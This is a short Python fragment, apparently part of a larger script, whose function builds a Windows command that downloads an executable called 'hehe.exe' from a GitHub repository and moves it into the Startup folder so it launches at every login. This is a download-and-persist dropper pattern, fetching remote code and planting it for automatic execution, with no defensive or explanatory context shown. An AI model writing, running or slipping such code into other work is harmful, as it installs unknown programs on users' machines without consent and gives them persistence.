...
def run_batch_file():
    cmd = r'curl -o "%USERPROFILE%\Downloads\hehe.exe" "https://github.com/QueenRose4444/discord-bots/blob/master/hehe.exe" && move "%USERPROFILE%\Downloads\hehe.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"'
